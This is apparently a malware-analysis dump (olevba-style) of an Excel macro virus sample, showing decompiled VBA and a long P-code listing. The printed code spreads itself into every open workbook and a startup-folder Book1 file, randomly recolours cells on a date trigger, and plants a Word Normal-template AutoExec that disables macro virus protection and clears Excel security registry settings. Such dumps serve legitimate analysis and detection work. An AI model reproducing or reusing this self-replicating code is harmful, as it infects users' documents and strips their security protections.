NT.InsertLines 2, "System.ProfileString(""Options"", ""EnableMacroVirusProtection"") = ""0"""
NT.InsertLines 3, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 4, "System.PrivateProfileString("""", ""HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel"", ""Options6"") = """""
NT.InsertLines 5, "End Sub"
WordObj.Run "Normal.ThisDocument.AutoExec"
End If
Set NT = Nothing
If Quit = True Then WordObj.Quit
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet1
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Interior.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/ThisWorkbook - 14257 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Workbook_WindowDeactivate(ByVal Wn As ))
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0037 "For yz = 1 To Workbooks(x).VBProject.VBComponents.Count"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004D "Weins1 = Workbooks(x).VBProject.VBComponents.Item(yz).CodeModule.CountOfLines"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "If Workbooks(x).VBProject.VBComponents.Item(yz).Type = 100 Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001F "If Weins1 > 30 Then OKEY = True"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "Next yz"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "Next x"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0014 "If OKEY <> True Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004E "If UCase(Dir("c:\" & Application.UserName)) = UCase(Application.UserName) Then"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x007A "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.AddFromFile "c:\" & Application.UserName"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0062 "Workbooks(Workbooks.Count).VBProject.VBComponents.Item("ThisWorkbook").CodeModule.DeleteLines 1, 4"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0004 "Else"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x004C "MsgBox "Why Did You Remove Sugar.Poppy?", vbQuestion, "VicodinES wonders...""
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0006 "End If"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0007 "End Sub"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	LitStr 0x000A "'VicodinES"
' 	Concat 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #53:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #54:
' 	ElseBlock 
' Line #55:
' 	LitVarSpecial (True)
' 	St didvic 
' Line #56:
' 	EndIfBlock 
' Line #57:
' 	EndIfBlock 
' Line #58:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	NextVar 
' Line #59:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #60:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #61:
' 	ArgsCall (Call) AbuseWord 0x0000 
' Line #62:
' 	LitVarSpecial (True)
' 	ParamNamed SaveChanges 
' 	LitStr 0x0006 "Book1."
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #63:
' 	EndIfBlock 
' Line #64:
' 	EndSub 
' Line #65:
' 	FuncDefn (Private Sub AbuseWord())
' Line #66:
' 	OnError (Resume Next) 
' Line #67:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set WordObj 
' Line #68:
' 	Ld WordObj 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #69:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set WordObj 
' Line #70:
' 	LitVarSpecial (True)
' 	St Quit 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld WordObj 
' 	MemLd NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NT 
' Line #73:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NT 
' 	ArgsMemLd Lines 0x0002 
' 	LitStr 0x0004 "'Vic"
' 	FnInStr3 
' 	IfBlock 
' Line #74:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #75:
' 	ElseBlock 
' Line #76:
' 	LitVarSpecial (False)
' 	Ld WordObj 
' 	MemLd Options 
' 	MemSt SaveNormalPrompt 
' Line #77:
' 	LitDI2 0x0001 
' 	Ld NT 
' 	MemLd CountOfLines 
' 	Ld NT 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #78:
' 	LitDI2 0x0001 
' 	LitStr 0x0013 "Sub AutoExec() 'Vic"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #79:
' 	LitDI2 0x0002 
' 	LitStr 0x0043 "System.ProfileString("Options", "EnableMacroVirusProtection") = "0""
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #80:
' 	LitDI2 0x0003 
' 	LitStr 0x0079 "System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #81:
' 	LitDI2 0x0004 
' 	LitStr 0x008C "System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Office\8.0\New User Settings\Excel\Microsoft Excel", "Options6") = """
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #82:
' 	LitDI2 0x0005 
' 	LitStr 0x0007 "End Sub"
' 	Ld NT 
' 	ArgsMemCall InsertLines 0x0002 
' Line #83:
' 	LitStr 0x001C "Normal.ThisDocument.AutoExec"
' 	Ld WordObj 
' 	ArgsMemCall Run 0x0001 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	SetStmt 
' 	LitNothing 
' 	Set NT 
' Line #86:
' 	Ld Quit 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld WordObj 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #87:
' 	EndSub 
' _VBA_PROJECT_CUR/VBA/Sheet1 - 7938 bytes
' Line #0:
' 	Dim (Public) 
' 	VarDefn run1
' 	VarDefn didvic (As Boolean)
' Line #1:
' 	FuncDefn (Private Sub Worksheet_Activate())
' Line #2:
' 	OnError (Resume Next) 
' Line #3:
' 	ArgsCall Read 0x0000 
' Line #4:
' 	Ld Now 
' 	ArgsLd Day 0x0001 
' 	Ld Now 
' 	ArgsLd Minute 0x0001 
' 	Eq 
' 	IfBlock 
' Line #5:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000A 
' 	For 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x001E 
' 	For 
' Line #6:
' 	LitDI2 0x0040 
' 	Ld y 
' 	Add 
' 	ArgsLd Chr 0x0001 
' 	Ld x 
' 	Concat 
' 	St rng 
' Line #7:
' 	Ld rng 
' 	ArgsLd Range 0x0001 
' 	ArgsMemCall Set 0x0000 
' Line #8:
' 	StartWithExpr 
' 	Ld Selection 
' 	MemLd Interior 
' 	With 
' Line #9:
' 	Ld Rnd 
' 	LitDI2 0x0032 
' 	Mul 
' 	FnInt 
' 	Paren 
' 	MemStWith ColorIndex 
' Line #10:
' 	Ld xlSolid 
' 	MemStWith Pattern 
' Line #11:
' 	EndWith 
' Line #12:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' 	BoS 0x0000 
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #13:
' 	EndIfBlock 
' Line #14:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	Ld Application 
' 	MemLd UserName 
' 	ArgsLd UCase 0x0001 
' 	Ne 
' 	IfBlock 
' Line #15:
' 	LitStr 0x0003 "c:\"
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #16:
' 	EndIfBlock 
' Line #17:
' 	Ld vbCr 
' 	St v1 
' Line #18:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #19:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #20:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld WeIn 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #21:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #22:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #24:
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #25:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0003 
' 	Ld Weins1 
' 	LitDI2 0x0002 
' 	Sub 
' 	Paren 
' 	Ld yz 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St VCode 
' 	EndIf 
' Line #26:
' 	Ld VCode 
' 	FnLen 
' 	LitDI2 0x0BB8 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	GoTo out 
' 	EndIf 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld yz 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #30:
' 	Label out 
' Line #31:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Add 
' 	ArgsLd Dir 0x0001 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0005 "Book1"
' 	ArgsLd UCase 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St PXLS 
' 	EndIf 
' Line #32:
' 	Ld PXLS 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld run1 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #33:
' 	LitVarSpecial (True)
' 	St run1 
' Line #34:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x0007 "\Book1."
' 	Concat 
' 	ParamNamed FileName 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToMru 
' 	Ld Workbooks 
' 	MemLd Add 
' 	ArgsMemCall SaveAs 0x0003 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Workbooks 
' 	MemLd Count 
' 	For 
' Line #37:
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St WeIn 
' Line #38:
' 	Ld WeIn 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #39:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x003F "Private Sub Workbook_WindowDeactivate(ByVal Wn As Excel.Window)"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #40:
' 	EndIfBlock 
' Line #41:
' 	StartForVariable 
' 	Ld yy 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #42:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St Weins1 
' Line #43:
' 	Ld Weins1 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #44:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0064 
' 	Eq 
' 	IfBlock 
' Line #45:
' 	LitStr 0x001E "Public run1, didvic As Boolean"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x0020 "Private Sub Worksheet_Activate()"
' 	Concat 
' 	Ld v1 
' 	Concat 
' 	Ld VCode 
' 	Concat 
' 	Paren 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' Line #46:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0002 
' Line #47:
' 	EndIfBlock 
' Line #48:
' 	EndIfBlock 
' Line #49:
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd TypeOf 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #50:
' 	Ld Weins1 
' 	Paren 
' 	LitDI2 0x0018 
' 	Ld yy 
' 	Ld x 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St findvic 
' Line #51:
' 	LitDI2 0x0001 
' 	Ld findvic 
' 	LitStr 0x0009 "VicodinES"
' 	FnInStr3 
' 	LitDI2 0x0002 
' 	Ne 
' 	Ld didvic 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	IfBlock 
' Line #52:
' 	Ld Weins1 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	LitStr 0x0018 "Private Sub Auto_Close()"
' 	Ld v1 
' 	Concat 
' 	LitStr 0x001C "For x = 1 To Workbooks.Count"
' 	Concat 
' 	Ld v1 
